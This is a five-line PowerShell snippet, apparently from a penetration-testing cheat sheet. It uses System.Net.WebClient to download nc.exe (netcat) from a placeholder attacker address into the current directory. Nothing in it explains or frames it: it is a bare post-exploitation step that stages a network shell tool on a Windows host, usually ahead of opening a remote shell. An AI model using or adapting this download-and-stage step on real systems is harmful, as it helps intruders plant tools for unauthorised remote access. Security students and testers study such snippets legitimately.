$storageDir = $pwd 
$webclient = New-Object System.Net.WebClient 
$url = "http://x.x.x.x/nc.exe" 
$file = "nc.exe" 
$webclient.DownloadFile($url,$file) 
